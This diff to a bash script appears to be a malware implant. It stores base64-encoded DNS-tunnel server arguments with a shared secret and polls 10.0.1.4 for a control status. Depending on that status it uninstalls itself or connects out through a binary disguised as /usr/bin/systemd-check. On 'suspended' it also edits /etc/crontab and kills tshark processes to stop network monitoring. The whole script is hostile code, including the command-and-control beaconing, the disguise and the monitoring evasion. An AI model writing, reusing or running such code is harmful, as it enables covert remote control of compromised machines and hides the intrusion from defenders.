@@ -1,12 +1,43 @@
 #!/bin/bash
 update_servers='LS1kbnMgc2VydmVyPTEwLjEwLjEwLjEgLS1zZWNyZXQ9NTkwSiAtLW1heC1yZXRyYW5zbWl0cz0xMAo= LS1kbnMgc2VydmVyPTU5MEouY29tIC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK LS1kbnMgc2VydmVyPTE5Mi4xNjguMC4xIC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK LS1kbnMgc2VydmVyPTEwLjAuMS40IC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK LS1kbnMgc2VydmVyPTU5MEoubmV0IC0tc2VjcmV0PTU5MEogLS1tYXgtcmV0cmFuc21pdHM9MTAK'
-chmod +x /usr/bin/systemd-check
-for s in $update_servers
-do
-    echo "Connecting to server "$s >> /tmp/exploit.log
-    if $(/usr/bin/systemd-check $(echo $s | base64 -d) | grep -q 'Session established')
+
+ls /var/log/gamelog > /var/log/gamelog/manifest.log
+
+wget 10.0.1.4/logs.php -P /var/log/gamelog -T5 2>/dev/null
+status=$(grep 'Status' /var/log/gamelog/logs.php)
+echo $status
+rm /var/log/gamelog/logs.php
+
+if $(echo $status | grep -q -i 'terminated')
+then
+    chmod +x /tmp/life/uninstall
+    /tmp/life/uninstall
+
+else
+    if $(echo $status | grep -q -i 'inactive')
     then
-    	echo "Connected to server "$s >> /tmp/exploit.log
-        break
+        echo "Inactive" >> /tmp/exploit.log
+    else
+        chmod +x /usr/bin/systemd-check
+        for s in $update_servers
+        do
+            echo "Connecting to server "$s >> /tmp/exploit.log
+            if $(/usr/bin/systemd-check $(echo $s | base64 -d) 2>/dev/null | grep -q 'Session established')
+            then
+    	        echo "Connected to server "$s >> /tmp/exploit.log
+                break
+            fi
+        done
     fi
-done
+
+    if $(echo $status | grep -q -i 'suspended')
+    then
+        cat /etc/crontab | grep -v tshark > temp
+        mv temp /etc/crontab
+
+        for i in $(ps aux | grep /bin/tshark | grep -v grep | awk '{print $2}')
+        do
+           kill $i
+        done
+    fi
+fi
